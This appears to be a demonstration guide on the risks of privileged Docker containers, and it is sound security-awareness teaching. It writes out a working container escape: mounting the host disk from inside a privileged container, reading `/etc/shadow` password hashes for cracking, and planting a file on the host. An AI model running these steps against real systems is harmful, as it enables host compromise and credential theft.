### Demonstrate why running containers in privileged mode can be a security risk to an organization.

Requirements: 

* Ubuntu 20.04 VM 2 cores 4 GBs of RAM or greater

* [Docker Installed](https://www.digitalocean.com/community/tutorials/how-to-install-and-use-docker-on-ubuntu-20-04)


### Prepare your environment

* After installing docker pull the latest image of alpine `docker pull alpine:latest`
* Run the following command to gain shell access in the container `docker run --privileged -it --rm alpine sh`
* Explain the reasoning one might have to run a container in a privileged mode. (Docker in a docker container is a good example)
* Explain that by running a container in a privileged mode can open up an organization to a number of attacks. 


### Show some examples of damage

* Explain that if an attacker was able to get shell access to a container running in privileged mode this is some things they could do to further penetrate the organization. 
* Run this command in the container shell `mount` you're looking for a directory that starts with `/dev/sda<NUMBER>` and if using the same OS mentioned above (Ubuntu 20.04) then it's `/dev/sda5`
* Create a temp mount directory inside the container shell. `mkdir host_mount`
* Then run the command `mount /dev/sda<NUMBER> /host_mount`
* `cd host_mount` and `ls` to show the hosts root file system. 
* `cat etc/shadow` to show the usernames and hashed passwords of users (John the Ripper Kali)
* Create a fake exploit `touch exploit`
* Exit the container shell to show that the fake exploit file still exists:
* Typing `exit` will get back to your vm shell and `cd /` will get you to the root directory of the vm you're running. Once at the root directory run `ls` to see the exploit still on the host machine. 
